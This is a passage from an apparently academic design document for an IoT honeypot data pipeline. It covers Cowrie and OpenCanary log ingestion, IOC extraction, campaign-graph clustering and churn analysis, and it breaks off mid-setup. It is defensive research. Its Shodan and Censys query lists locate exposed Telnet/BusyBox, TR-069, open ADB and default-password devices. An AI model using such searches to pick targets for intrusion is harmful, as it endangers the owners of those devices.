    event_count     INT DEFAULT 0,
    login_attempts  INT DEFAULT 0,
    unique_sessions INT DEFAULT 0,
    first_event     TIMESTAMPTZ,
    last_event      TIMESTAMPTZ,
    PRIMARY KEY (day, source_ip, honeypot)
);

CREATE INDEX ON ip_activity_daily (day DESC);
CREATE INDEX ON ip_activity_daily (source_ip);

-- ============================================================
-- PIPELINE RUNS (provenance — every task execution is recorded)
-- ============================================================
CREATE TABLE pipeline_runs (
    run_id           UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    task_name        VARCHAR(100) NOT NULL,
    started_at       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    completed_at     TIMESTAMPTZ,
    status           VARCHAR(20) NOT NULL DEFAULT 'running',  -- 'running'|'success'|'failed'
    records_in       INT DEFAULT 0,      -- input log lines / API results read
    records_out      INT DEFAULT 0,      -- records inserted or updated in DB
    source_files     TEXT[],             -- raw file paths processed this run
    pipeline_version VARCHAR(64),        -- git commit hash of pipeline code
    parameters       JSONB DEFAULT '{}'  -- query strings, bookmark offsets, API filters
);

CREATE INDEX ON pipeline_runs (task_name, started_at DESC);
CREATE INDEX ON pipeline_runs (status);

-- Add FK constraint now that pipeline_runs is defined
ALTER TABLE honeypot_events
    ADD CONSTRAINT fk_honeypot_pipeline_run
    FOREIGN KEY (pipeline_run_id) REFERENCES pipeline_runs(run_id);
```

---

### 7.3 Disk Allocation

| Path | Allocated | Contents |
|---|---|---|
| `/` (root OS) | 8 GB | Ubuntu, packages, pipeline source code |
| `/var/lib/postgresql` | 10 GB | PostgreSQL data directory |
| `/home/cowrie/cowrie/var` | 5 GB | Cowrie logs + downloaded malware samples |
| `/var/log`, `/var/tmp` | 3 GB | Pipeline logs, OpenCanary logs, system logs |
| `/swapfile` | 2 GB | Swap (1 GB active, 1 GB headroom) |
| **Free buffer** | **7 GB** | Growth headroom for 6-month collection |

---

### 7.4 Partition Pruning and Retention

Drop old partitions after 6 months to keep the database size bounded:
```sql
-- Example: drop data from more than 6 months ago
DROP TABLE IF EXISTS honeypot_events_2025_10;
DROP TABLE IF EXISTS honeypot_events_2025_11;
```

> Consider installing the `pg_partman` extension to automate partition lifecycle management.

---

## 8. Pipeline DAG Architecture

### 8.1 Why Custom Python + Cron (Not Airflow/Prefect)

| Framework | RAM at Idle | Notes |
|---|---|---|
| **Apache Airflow** | **800 MB – 1.2 GB** | Scheduler + webserver + worker. Not viable. |
| **Prefect 3.x** (self-hosted server) | **450–700 MB** | Better, but server process is always alive |
| **Prefect 3.x** (cloud + local worker) | ~50 MB | Worker-only mode is viable if using Prefect Cloud free tier |
| **Luigi** (`luigid` daemon) | **30–50 MB** | Good choice if you want UI + dependency tracking |
| **Custom Python + cron** | **0 MB idle** | Best choice for this VPS; pipeline only consumes RAM during execution |

**Decision**: Use **custom Python + cron** for Phase 1. If a visual task graph or complex dependency tracking becomes necessary, switch to Luigi (add only ~40 MB).

---

### 8.2 Full DAG Structure

```
DAG: iot_research_pipeline
│
├── ─── EVERY 30 MINUTES ───────────────────────────────────────────────────
│
│   ┌──────────────────────┐    ┌──────────────────────┐
│   │  T01: ingest_cowrie  │    │ T02: ingest_opencanary│
│   │  reads cowrie.json   │    │ reads opencanary.log  │
│   │  (new lines only,    │    │ (new lines only)      │
│   │  via byte bookmark)  │    │ maps logtype→protocol │
│   └──────────┬───────────┘    └──────────┬────────────┘
│              └──────────────┬────────────┘
│                             │
│              ┌──────────────▼────────────┐
│              │  T03: store_raw_events    │
│              │  bulk INSERT into         │
│              │  honeypot_events          │
│              └──────────────┬────────────┘
│                             │
│         ┌───────────────────┼───────────────────┐
│         │                   │                   │
│  ┌──────▼──────┐   ┌────────▼──────┐   ┌────────▼──────────┐
│  │T04: extract │   │T05: extract   │   │T06: extract       │
│  │credentials  │   │download URLs  │   │C2 endpoints       │
│  │UPSERT into  │   │regex parse    │   │DNS resolve domains│
│  │credentials  │   │command_str    │   │UPSERT ioc_records │
│  └─────────────┘   └───────────────┘   └───────────────────┘
│
├── ─── DAILY at 01:00 UTC ─────────────────────────────────────────────────
│
│   ┌────────────────────────────────┐
│   │  T07: aggregate_churn          │
│   │  INSERT INTO ip_activity_daily │
│   │  SELECT ... FROM honeypot_events│
│   │  WHERE event_time::DATE = yesterday│
│   └────────────────────────────────┘
│
├── ─── WEEKLY (Sunday 02:00 UTC) ──────────────────────────────────────────
│
│   ┌──────────────────┐    ┌──────────────────┐
│   │  T08: poll_shodan│    │T09: poll_censys  │
│   │  IoT queries     │    │IoT queries       │
│   │  INSERT device_  │    │INSERT device_    │
│   │  records         │    │records           │
│   └──────────────────┘    └──────────────────┘
│
├── ─── WEEKLY (Sunday 04:00 UTC) ──────────────────────────────────────────
│
│   ┌─────────────────────────────────────────┐
│   │  T10: build_networkx_graph               │
│   │  loads ioc_records + device_records     │
│   │  builds nx.DiGraph with typed edges     │
│   │  runs Louvain community detection       │
│   │  writes edges to graph_edges table      │
│   │  serializes GraphML for reproducibility │
│   └────────────────────┬────────────────────┘
│                        │
│   ┌────────────────────▼────────────────────┐
│   │  T11: cluster_campaigns                  │
│   │  groups IPs by shared credentials/C2    │
│   │  UPSERT into campaign_clusters          │
│   │  computes churn rate per cluster        │
│   └─────────────────────────────────────────┘
```

---

### 8.3 Cron Schedule

The cron is split: the **VPS** runs only sensor health tasks. The **local machine** runs the full pipeline.

#### VPS crontab — minimal (sensor tasks only)

```cron
# /etc/cron.d/vps-sensor  (on VPS only)

# Honeypot health check: every 5 minutes
*/5 * * * *   root   python3 /usr/local/bin/honeypot_healthcheck.py

# Disk usage alert: every hour
0 * * * *     root   /usr/local/bin/disk-check.sh
```

#### Local machine crontab — full pipeline

```cron
# crontab -e  (on LOCAL machine, as researcher user)

# Step 1: Pull raw logs from VPS (every 30 minutes)
*/30 * * * *  rsync -avz --append-verify \
    -e "ssh -p 2222 -i ~/.ssh/research_key" \
    cowrie@VPS_IP:/home/cowrie/cowrie/var/log/cowrie/ \
    /data/raw-logs/cowrie/ >> /var/log/iot-pipeline/sync.log 2>&1

*/30 * * * *  rsync -avz --append-verify \
    -e "ssh -p 2222 -i ~/.ssh/research_key" \
    root@VPS_IP:/var/tmp/opencanary.log \
    /data/raw-logs/opencanary/ >> /var/log/iot-pipeline/sync.log 2>&1

# Step 2: Process synced logs (5-min offset lets rsync finish first)
5,35 * * * *  /opt/iot-pipeline/run.py --tasks ingest,extract >> /var/log/iot-pipeline/run.log 2>&1

# IP churn daily aggregation: 01:00 UTC
0 1  * * *    /opt/iot-pipeline/run.py --tasks aggregate_churn >> /var/log/iot-pipeline/daily.log 2>&1

# Shodan + Censys weekly snapshots: Sunday 02:00 UTC
0 2  * * 0    /opt/iot-pipeline/run.py --tasks poll_shodan,poll_censys >> /var/log/iot-pipeline/weekly.log 2>&1

# Graph build + campaign clustering: Sunday 04:00 UTC
0 4  * * 0    /opt/iot-pipeline/run.py --tasks build_graph,cluster >> /var/log/iot-pipeline/weekly.log 2>&1
```

> **Note**: `5,35 * * * *` (at :05 and :35 past each hour) gives rsync a 5-minute window to complete before the ingest task reads the local mirror. This prevents reading a partially-synced file.

---

### 8.4 Deployment Split — VPS vs Local

| Component | Runs On | Reason |
|---|---|---|
| Cowrie | **VPS** | Needs public IP to receive SSH/Telnet attacks |
| OpenCanary | **VPS** | Needs public IP for multi-protocol exposure |
| Glutton | **VPS** | Catch-all TPROXY must run on the public-facing machine |
| Raw log files | **VPS** (source) → **Local** (mirror) | Written by honeypots on VPS; rsync-pulled to local |
| PostgreSQL | **Local** | No VPS RAM consumed; full local disk; zero query latency |
| Honeypot log ingestion | **Local** | Reads locally-mirrored files; no VPS resources used |
| IOC extraction | **Local** | CPU/regex-intensive; runs against local DB |
| Shodan API polling | **Local** | Just HTTP calls — no reason to waste VPS RAM |
| Censys API polling | **Local** | Same — local machine has no RAM constraint |
| Malware feeds (Phase 2) | **Local** | Free API calls; no VPS needed |
| Passive DNS (Phase 2) | **Local** | Dataset downloads can be large (GB range) |
| NetworkX graph building | **Local** | Memory-intensive; grows over the 6-month window |
| Campaign clustering | **Local** | Compute-intensive; runs weekly |
| `pipeline_runs` provenance | **Local** | Part of local PostgreSQL |
| Analysis notebooks | **Local** | Researcher's development environment |

---

### 8.5 Log Synchronization

Logs are pulled from VPS to local using `rsync` over SSH. This is the **only data movement** in the system — everything else runs entirely local.

#### SSH key setup (one time)

```bash
# Generate a dedicated sync key on the local machine
ssh-keygen -t ed25519 -f ~/.ssh/research_key -C "iot-pipeline-sync"

# Copy public key to the VPS cowrie user
ssh-copy-id -i ~/.ssh/research_key.pub -p 2222 cowrie@VPS_IP

# (Optional) Restrict key to rsync-only — no interactive shell on VPS
# Prepend this line to /home/cowrie/.ssh/authorized_keys on the VPS:
# command="rsync --server --sender -avz . /home/cowrie/cowrie/var/log/cowrie/",no-pty,no-agent-forwarding,no-port-forwarding ssh-ed25519 AAAA...
```

#### Local directory setup (one time)

```bash
mkdir -p /data/raw-logs/cowrie \
         /data/raw-logs/opencanary \
         /data/raw-logs/glutton \
         /var/log/iot-pipeline
```

#### rsync pull commands

```bash
# Cowrie logs
rsync -avz --append-verify \
    -e "ssh -p 2222 -i ~/.ssh/research_key -o StrictHostKeyChecking=yes" \
    cowrie@VPS_IP:/home/cowrie/cowrie/var/log/cowrie/ \
    /data/raw-logs/cowrie/

# OpenCanary log
rsync -avz --append-verify \
    -e "ssh -p 2222 -i ~/.ssh/research_key" \
    root@VPS_IP:/var/tmp/opencanary.log \
    /data/raw-logs/opencanary/
```

**Key rsync flags:**
- `--append-verify`: appends new bytes to still-growing log files, then checksums. Handles active logs correctly.
- `-a` (archive): preserves timestamps — important for the `collected_at` provenance field.
- `-z`: compresses in transit — reduces bandwidth on large log files.

> **Raw logs are never deleted from local disk.** The byte-offset bookmark tracks read position; if the pipeline re-runs, it picks up exactly where it left off. If something breaks, raw files are always there to replay from scratch.

---

### 8.6 Common Schema and Provenance

A research-grade pipeline must be **reproducible**, **traceable**, and **modular**.

| Pillar | Requirement | How it is achieved |
|---|---|---|
| **Reproducible** | Re-running the pipeline on the same raw data produces identical results | Raw logs preserved forever; exact API queries logged with parameters; pipeline code pinned via git commit hash |
| **Traceable** | Every result traces back to: source → raw file → pipeline task → DB record | `pipeline_run_id` on every event; `pipeline_runs` table records what ran, when, on what input, at which git commit |
| **Modular** | Each step reads from a defined input, writes to a defined output; changing one step does not break others | Tasks are independent Python functions; idempotent UPSERTs; steps share no mutable state |

#### `NormalizedEvent` — the common data format

Every data source (Cowrie, OpenCanary, Shodan, Censys, and future Phase 2 sources) maps to this canonical Python structure **before** writing to the database. This is the single "common format" all sources must conform to.

```python
# /opt/iot-pipeline/pipeline/schema.py
import uuid
from datetime import datetime, timezone
from typing import Any, Optional, TypedDict


class NormalizedEvent(TypedDict):
    # ── Identity ─────────────────────────────────────────────────────
    record_id:        str        # UUID4, generated at ingestion time
    source:           str        # 'cowrie' | 'opencanary' | 'glutton'
                                 # | 'shodan' | 'censys' | 'malwarebazaar'

    # ── Time ─────────────────────────────────────────────────────────
    event_time:       str        # ISO8601 — when the event happened on VPS
    collected_at:     str        # ISO8601 — log file mtime on VPS (preserved by rsync -a)
    ingested_at:      str        # ISO8601 — when this pipeline run processed it

    # ── Provenance ───────────────────────────────────────────────────
    pipeline_run_id:  str        # UUID — FK to pipeline_runs table
    pipeline_version: str        # git commit hash: `git rev-parse --short HEAD`
    raw_file_path:    str        # absolute path on local disk: /data/raw-logs/cowrie/cowrie.json
    raw_line_number:  int        # exact line number in that file (enables byte-perfect replay)

    # ── Content (nullable — not every source has every field) ────────
    source_ip:        Optional[str]
    source_port:      Optional[int]
    dest_port:        Optional[int]
    protocol:         Optional[str]
    event_type:       Optional[str]
    session_id:       Optional[str]
    username:         Optional[str]
    password:         Optional[str]
    command_str:      Optional[str]
    download_url:     Optional[str]
    file_hash:        Optional[str]
    hassh:            Optional[str]
    user_agent:       Optional[str]
    http_path:        Optional[str]
    asn:              Optional[str]
    country_code:     Optional[str]
    org:              Optional[str]

    # ── Raw (always preserved verbatim) ──────────────────────────────
    raw_data:         dict[str, Any]   # original JSON from source, never modified


def make_event(
    source: str,
    run_id: str,
    git_hash: str,
    raw_file: str,
    line_no: int,
    raw: dict,
) -> NormalizedEvent:
    """Build a NormalizedEvent with all required provenance fields populated."""
    return NormalizedEvent(
        record_id=str(uuid.uuid4()),
        source=source,
        event_time=raw.get("timestamp", datetime.now(timezone.utc).isoformat()),
        collected_at=raw.get("collected_at", ""),
        ingested_at=datetime.now(timezone.utc).isoformat(),
        pipeline_run_id=run_id,
        pipeline_version=git_hash,
        raw_file_path=raw_file,
        raw_line_number=line_no,
        source_ip=None, source_port=None, dest_port=None,
        protocol=None, event_type=None, session_id=None,
        username=None, password=None, command_str=None,
        download_url=None, file_hash=None, hassh=None,
        user_agent=None, http_path=None, asn=None,
        country_code=None, org=None,
        raw_data=raw,
    )
```

#### `pipeline_version` — pinning the git commit

```python
# Add to /opt/iot-pipeline/pipeline/core.py
import subprocess

def get_pipeline_version() -> str:
    """Returns the current git commit hash, or 'unversioned' if not in a git repo."""
    try:
        result = subprocess.run(
            ["git", "rev-parse", "--short", "HEAD"],
            cwd="/opt/iot-pipeline",
            capture_output=True, text=True, timeout=5,
        )
        return result.stdout.strip() or "unversioned"
    except Exception:
        return "unversioned"
```

#### Traceability chain

Given any row in `honeypot_events`, you can trace it back to the exact raw bytes that produced it:

```
honeypot_events (id = 98765)
    pipeline_run_id = "f3a1-bc42-..."
           │
           ▼
    pipeline_runs (run_id = "f3a1-bc42-...")
           ├── task_name:        "ingest_cowrie"
           ├── started_at:       "2026-04-10T03:30:00Z"
           ├── source_files:     ["/data/raw-logs/cowrie/cowrie.json"]
           ├── pipeline_version: "a3f9c21"  →  git show a3f9c21  (exact code that ran)
           ├── records_in:       847        →  log lines read from raw file
           ├── records_out:      831        →  events inserted (16 malformed/dupes skipped)
           └── parameters: {"bookmark_offset": 182934, "new_offset": 219847}
                            →  exact byte range in /data/raw-logs/cowrie/cowrie.json
```

This chain means: for any result in the paper, you can identify the exact raw bytes, the exact code version, and the exact timestamp — satisfying the reproducibility requirements of IEEE IoT-J reviewers.

---

## 9. Pipeline Implementation

### 9.1 Task Decorator Pattern

```python
#!/usr/bin/env python3
"""
/opt/iot-pipeline/pipeline/core.py
Minimal DAG task decorator with structured logging and error isolation.
"""
import logging
import sys
from datetime import datetime
from functools import wraps
from pathlib import Path

LOG_DIR = Path("/var/log/iot-pipeline")
LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
    handlers=[
        logging.FileHandler(LOG_DIR / "pipeline.log"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("pipeline")


def task(name: str):
    """Decorator that wraps a pipeline step with logging and error isolation."""
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            logger.info(f"START task={name}")
            start = datetime.now()
            try:
                result = fn(*args, **kwargs)
                elapsed = (datetime.now() - start).total_seconds()
                logger.info(f"DONE  task={name} elapsed={elapsed:.1f}s")
                return result
            except Exception as e:
                elapsed = (datetime.now() - start).total_seconds()
                logger.error(
                    f"FAIL  task={name} elapsed={elapsed:.1f}s error={e}",
                    exc_info=True,
                )
                return None
        return wrapper
    return decorator
```

---

### 9.2 Log Bookmark (Incremental Reads)

```python
"""
/opt/iot-pipeline/pipeline/bookmark.py
Tracks byte offset in log files so only new lines are processed each run.
Handles log rotation via inode tracking.
"""
import json
from pathlib import Path

BOOKMARK_DIR = Path("/var/lib/iot-pipeline")
BOOKMARK_DIR.mkdir(parents=True, exist_ok=True)


def get_bookmark(log_name: str) -> dict:
    path = BOOKMARK_DIR / f"{log_name}.bookmark.json"
    if path.exists():
        return json.loads(path.read_text())
    return {"inode": None, "offset": 0}


def set_bookmark(log_name: str, inode: int, offset: int) -> None:
    path = BOOKMARK_DIR / f"{log_name}.bookmark.json"
    path.write_text(json.dumps({"inode": inode, "offset": offset}))


def read_new_lines(log_path: Path, log_name: str) -> list[str]:
    """Read only lines added since the last run. Returns list of raw line strings."""
    bm = get_bookmark(log_name)
    lines = []
    try:
        stat = log_path.stat()
        current_inode = stat.st_ino
        with open(log_path, "rb") as f:
            if bm["inode"] != current_inode:
                # Log was rotated — start from beginning of new file
                bm["offset"] = 0
            f.seek(bm["offset"])
            raw = f.read()
            new_offset = f.tell()
        set_bookmark(log_name, current_inode, new_offset)
        lines = [l for l in raw.decode(errors="replace").splitlines() if l.strip()]
    except FileNotFoundError:
        pass  # Log file does not exist yet — normal during startup
    return lines
```

---

### 9.3 Cowrie Log Ingestion

```python
"""
/opt/iot-pipeline/pipeline/ingest_cowrie.py
"""
import json
from datetime import datetime, timezone
from pathlib import Path

from .bookmark import read_new_lines
from .core import task

# Reads from the LOCAL rsync mirror of the VPS log — not the VPS directly
COWRIE_LOG = Path("/data/raw-logs/cowrie/cowrie.json")


def parse_cowrie_event(raw: str) -> dict | None:
    """Parse a single Cowrie JSON log line into a normalized event dict."""
    try:
        e = json.loads(raw)
    except json.JSONDecodeError:
        return None

    return {
        "event_time":   e.get("timestamp"),
        "source_ip":    e.get("src_ip"),
        "source_port":  e.get("src_port"),
        "dest_port":    e.get("dst_port"),
        "honeypot":     "cowrie",
        "protocol":     "ssh" if "ssh" in e.get("eventid", "") else "telnet",
        "event_type":   e.get("eventid", "").replace("cowrie.", ""),
        "session_id":   e.get("session"),
        "username":     e.get("username"),
        "password":     e.get("password"),
        "command_str":  e.get("input"),
        "download_url": e.get("url"),
        "file_hash":    e.get("shasum"),
        "hassh":        e.get("hasshAlgorithms") or e.get("hassh"),
        "raw_data":     e,
    }


@task("ingest_cowrie")
def ingest_cowrie() -> list[dict]:
    """Read new Cowrie log lines and return parsed event dicts."""
    raw_lines = read_new_lines(COWRIE_LOG, "cowrie")
    events = [parse_cowrie_event(line) for line in raw_lines]
    return [e for e in events if e is not None]
```

---

### 9.4 IOC Extraction

```python
"""
/opt/iot-pipeline/pipeline/extract_iocs.py
"""
import re
from datetime import datetime, timezone

from .core import task

URL_REGEX = re.compile(
    r'https?://[^\s\'"<>;\|&`]+'
    r'|ftp://[^\s\'"<>;\|&`]+'
)
IP_REGEX = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
# Exclude RFC 1918 private ranges and loopback from IOCs
PRIVATE_PREFIXES = ("10.", "172.16.", "172.17.", "192.168.", "127.")


def is_public_ip(ip: str) -> bool:
    return not any(ip.startswith(p) for p in PRIVATE_PREFIXES)


@task("extract_iocs")
def extract_iocs(events: list[dict]) -> list[dict]:
    """
    Extract IOCs from a list of normalized honeypot events.
    Returns a list of IOC dicts ready for UPSERT into ioc_records.
    """
    iocs = []
    now = datetime.now(timezone.utc).isoformat()

    for event in events:
        etype = event.get("event_type", "")

        # Credential IOCs
        if "login" in etype and event.get("username"):
            iocs.append({
                "ioc_type":  "credential",
                "ioc_value": f"{event['username']}:{event.get('password', '')}",
                "first_seen": now,
                "last_seen":  now,
                "source_honeypots": [event["honeypot"]],
            })

        # URL and IP IOCs from command strings
        if etype == "command.input" and event.get("command_str"):
            cmd = event["command_str"]
            for url in URL_REGEX.findall(cmd):
                iocs.append({
                    "ioc_type":  "url",
                    "ioc_value": url,
                    "first_seen": now,
                    "last_seen":  now,
                    "source_honeypots": ["cowrie.command"],
                })
            for ip in IP_REGEX.findall(cmd):
                if is_public_ip(ip):
                    iocs.append({
                        "ioc_type":  "ip",
                        "ioc_value": ip,
                        "first_seen": now,
                        "last_seen":  now,
                        "source_honeypots": ["cowrie.command"],
                    })

        # Download URL and file hash IOCs
        if etype == "session.file_download":
            if event.get("download_url"):
                iocs.append({
                    "ioc_type":  "url",
                    "ioc_value": event["download_url"],
                    "first_seen": now,
                    "last_seen":  now,
                    "source_honeypots": ["cowrie.download"],
                })
            if event.get("file_hash"):
                iocs.append({
                    "ioc_type":  "sha256",
                    "ioc_value": event["file_hash"],
                    "first_seen": now,
                    "last_seen":  now,
                    "source_honeypots": ["cowrie.download"],
                })

        # SSH client fingerprint (hassh)
        if event.get("hassh"):
            iocs.append({
                "ioc_type":  "hassh",
                "ioc_value": event["hassh"],
                "first_seen": now,
                "last_seen":  now,
                "source_honeypots": ["cowrie"],
            })

    return iocs
```

---

### 9.5 Shodan Integration

```python
"""
/opt/iot-pipeline/pipeline/poll_shodan.py
Weekly snapshot of IoT devices matching botnet/compromise indicators.
"""
import os
import time
import shodan
from .core import task, logger

API_KEY = os.environ["SHODAN_API_KEY"]

# Queries targeting IoT compromise signals
IOT_QUERIES = [
    'product:Mirai',
    'port:23 "BusyBox"',
    'port:7547',                        # TR-069 (router CPE management)
    'port:5555 "Android Debug Bridge"', # ADB
    '"default password" port:80',
]


@task("poll_shodan")
def poll_shodan(max_per_query: int = 1000) -> list[dict]:
    api = shodan.Shodan(API_KEY)
    results = []

    for query in IOT_QUERIES:
        try:
            for banner in api.search_cursor(query):
                results.append({
                    "source":       "shodan",
                    "ip":           banner.get("ip_str"),
                    "port":         banner.get("port"),
                    "org":          banner.get("org"),
                    "isp":          banner.get("isp"),
                    "country_code": banner.get("location", {}).get("country_code"),
                    "asn":          banner.get("asn"),
                    "product":      banner.get("product"),
                    "version":      banner.get("version"),
                    "cpe":          banner.get("cpe", []),
                    "cve_ids":      list(banner.get("vulns", {}).keys()),
                    "raw_data":     banner,
                })
                if len(results) >= max_per_query:
                    break
                time.sleep(1.1)  # Respect Shodan rate limits (~1 req/sec)
        except shodan.APIError as e:
            logger.error(f"Shodan API error for query '{query}': {e}")

    logger.info(f"Shodan collected {len(results)} device records")
    return results
```

> **API Limits**: Free Shodan = 100 results/query. Paid Developer (~$49/month) = 10,000 credits/month. Apply for **academic research access** for free elevated limits.

---

### 9.6 Censys Integration

```python
"""
/opt/iot-pipeline/pipeline/poll_censys.py
Weekly snapshot from Censys v2 API.
"""
import os
from censys.search import CensysHosts
from .core import task, logger

IOT_QUERIES = [
    'services.port=23 and services.banner="BusyBox"',
    'services.port=7547',
    'services.port=5555 and services.banner="Android Debug Bridge"',
]


@task("poll_censys")
def poll_censys(max_results: int = 500) -> list[dict]:
    h = CensysHosts(
        api_id=os.environ["CENSYS_API_ID"],
        api_secret=os.environ["CENSYS_API_SECRET"],
    )
    results = []

    for query in IOT_QUERIES:
        try:
            for page in h.search(query, per_page=100, pages=5):
                for host in page:
                    results.append({
                        "source":   "censys",
                        "ip":       host.get("ip"),
                        "services": host.get("services", []),
                        "location": host.get("location", {}),
                        "asn_info": host.get("autonomous_system", {}),
                        "raw_data": host,
                    })
                    if len(results) >= max_results:
                        break
        except Exception as e:
            logger.error(f"Censys error for query '{query}': {e}")

    logger.info(f"Censys collected {len(results)} host records")
    return results
```

> **API Limits**: Free Censys = 250 queries/month, 100 results each. Apply for **academic/research access** at censys.io for higher limits.

---

### 9.7 Graph Builder

```python
"""
/opt/iot-pipeline/pipeline/build_graph.py
Weekly: load IOCs + device records, build NetworkX graph,
run community detection, write results back to PostgreSQL.
"""
import json
from pathlib import Path
import networkx as nx
from community import community_louvain   # pip install python-louvain
from .core import task, logger

GRAPH_OUTPUT = Path("/var/lib/iot-pipeline/graph.graphml")


@task("build_networkx_graph")
def build_networkx_graph(ioc_records: list[dict], device_records: list[dict]) -> nx.DiGraph:
    G = nx.DiGraph()

    # Add IOC nodes
    for ioc in ioc_records:
        G.add_node(
            ioc["ioc_value"],
            node_type=ioc["ioc_type"],
            first_seen=str(ioc.get("first_seen", "")),
            last_seen=str(ioc.get("last_seen", "")),
        )

    # Add typed edges from co-occurrence signals
    # (This is a simplified example — real logic reads from DB)
    for record in device_records:
        ip = record.get("ip")
        if ip:
            G.add_node(ip, node_type="ip")

    logger.info(f"Graph: {G.number_of_nodes()} nodes, {G.number_of_edges()} edges")

    # Community detection (Louvain on undirected projection)
    G_undirected = G.to_undirected()
    if G_undirected.number_of_nodes() > 0:
        partition = community_louvain.best_partition(G_undirected)
        nx.set_node_attributes(G, partition, "cluster_id")
        n_clusters = len(set(partition.values()))
        logger.info(f"Community detection: {n_clusters} clusters found")

    # Serialize for reproducibility
    nx.write_graphml(G, str(GRAPH_OUTPUT))
    logger.info(f"Graph written to {GRAPH_OUTPUT}")

    return G
```

---

## 10. Log Rotation and Disk Management

Create `/etc/logrotate.d/cowrie`:
```
/home/cowrie/cowrie/var/log/cowrie/*.json
/home/cowrie/cowrie/var/log/cowrie/*.log {
    daily
    missingok
    rotate 14
    compress
    delaycompress
    notifempty
    create 640 cowrie cowrie
    sharedscripts
    postrotate
        systemctl reload cowrie 2>/dev/null || true
    endscript
}
```

Create `/etc/logrotate.d/opencanary`:
```
/var/tmp/opencanary.log {
    daily
    missingok
    rotate 14
    compress
    delaycompress
    notifempty
}
```

Create `/etc/logrotate.d/iot-pipeline`:
```
/var/log/iot-pipeline/*.log {
    weekly
    rotate 8
    compress
    delaycompress
    missingok
}
```

Disk usage alert script at `/usr/local/bin/disk-check.sh`:
```bash
#!/bin/bash
THRESHOLD=85
USAGE=$(df / | tail -1 | awk '{print $5}' | tr -d '%')
if [ "$USAGE" -gt "$THRESHOLD" ]; then
    echo "$(date): Disk at ${USAGE}% on $(hostname)" >> /var/log/disk_alert.log
    # Optional: send email
    # echo "Disk usage at ${USAGE}%" | mail -s "DISK ALERT" you@example.com
fi
```

```bash
sudo chmod +x /usr/local/bin/disk-check.sh
```

---

## 11. Churn Analysis Queries

These SQL queries power the **longitudinal analysis** section of the paper (Section 9 of the paper outline: Lifecycle and Longitudinal Dynamics).

```sql
-- New attacker IPs this week (appeared this week, not seen last week)
SELECT source_ip FROM ip_activity_daily
WHERE day BETWEEN CURRENT_DATE - 7 AND CURRENT_DATE
EXCEPT
SELECT source_ip FROM ip_activity_daily
WHERE day BETWEEN CURRENT_DATE - 14 AND CURRENT_DATE - 8;

-- Churned IPs (were active last week, disappeared this week)
SELECT source_ip FROM ip_activity_daily
WHERE day BETWEEN CURRENT_DATE - 14 AND CURRENT_DATE - 8
EXCEPT
SELECT source_ip FROM ip_activity_daily
WHERE day BETWEEN CURRENT_DATE - 7 AND CURRENT_DATE;

-- Weekly active IP count and volume (for timeline plot / Fig. 2)
SELECT
    DATE_TRUNC('week', day) AS week_start,
    COUNT(DISTINCT source_ip) AS active_ips,
    SUM(event_count) AS total_events
FROM ip_activity_daily
GROUP BY week_start
ORDER BY week_start;

-- Weekly churn rate (new IPs / total IPs)
WITH weekly AS (
    SELECT
        DATE_TRUNC('week', day) AS week_start,
        COUNT(DISTINCT source_ip) AS total_ips
    FROM ip_activity_daily
    GROUP BY 1
),
new_weekly AS (
    SELECT
        DATE_TRUNC('week', day) AS week_start,
        COUNT(DISTINCT source_ip) AS new_ips
    FROM ip_activity_daily a
    WHERE NOT EXISTS (
        SELECT 1 FROM ip_activity_daily b
        WHERE b.source_ip = a.source_ip
          AND b.day < a.day
          AND b.day >= a.day - INTERVAL '7 days'
    )
    GROUP BY 1
)
SELECT w.week_start,
       w.total_ips,
       n.new_ips,
       ROUND(n.new_ips::NUMERIC / NULLIF(w.total_ips, 0) * 100, 1) AS churn_pct
FROM weekly w
JOIN new_weekly n USING (week_start)
ORDER BY w.week_start;

-- Top credential pairs (for credential dictionary analysis / Fig. 4)
SELECT username, password, attempt_count, success_count
FROM credentials
ORDER BY attempt_count DESC
LIMIT 50;

-- Campaign size distribution (for Fig. 6)
SELECT cluster_id, source_ip_count, event_count,
       EXTRACT(EPOCH FROM (last_seen - first_seen)) / 86400 AS lifetime_days
FROM campaign_clusters
ORDER BY source_ip_count DESC;
```

---

## 12. Phase 2 Additions

After Phase 1 is stable (weeks 3–5), add these vantage points:

| Addition | Runs On | Tool / Source | Notes |
|---|---|---|---|
| **Malware feeds** | **Local** | MalwareBazaar API, Abuse.ch URLhaus | Free APIs; add `poll_malware_feeds` to the weekly local cron. No VPS needed. |
| **Passive DNS** | **Local** | Farsight DNSDB, SecurityTrails, Rapid7 FDNS | Apply for academic access early — takes weeks. Dataset downloads can be large (GB). Runs entirely on local. |
| **IP reputation enrichment** | **Local** | AbuseIPDB API (free: 1k/day) | Enrich `source_ips.abuse_score` after each ingestion batch. Runs on local, writes to local DB. |
| **MQTT capture** | **VPS** | Dionaea | Only add to VPS if Glutton logs confirm MQTT probe traffic. Check RAM headroom before adding (~100–200 MB). |
| **Risk scoring model** | **Local** | scikit-learn (Random Forest) | Compute-intensive; runs entirely on local. Features: ASN type, port exposure, credential reuse, churn rate, campaign membership. |

---

## 13. Key Constraints and Notes

### API Rate Limits and Free Tier Constraints

| API | Free Tier Limit | Action |
|---|---|---|
| Shodan | 100 results/query, ~1 search credit/query | Apply for **academic research access** immediately. Takes 1–2 weeks to process. |
| Censys | 250 queries/month, 100 results each | Apply for **research access** at censys.io. |
| Farsight DNSDB | No free tier (trial available) | Apply for academic access or use Rapid7 Open DNS dataset (free). |
| AbuseIPDB | 1,000 checks/day on free tier | Sufficient for enriching new IPs from honeypot events. |

### GDPR / German Law Considerations

- This VPS is in **Germany** — subject to **DSGVO** (German GDPR implementation)
- Attacker IPs may be classified as personal data under some German legal interpretations
- **Mitigations**:
  - Store only what is needed for security research (data minimization principle)
  - Use `LEGITIMATE INTEREST` as legal basis for processing
  - **Pseudonymize IPs before any public release** (SHA256 hash + salt)
  - Do not publish raw attacker IP lists in paper appendices
  - Add a data handling statement to the paper's Ethics section (Section 3 of paper outline)

### Pipeline Dependency Installation

```bash
# Create pipeline system user
sudo useradd -r -s /bin/false -d /opt/iot-pipeline pipeline
sudo mkdir -p /opt/iot-pipeline /var/lib/iot-pipeline /var/log/iot-pipeline
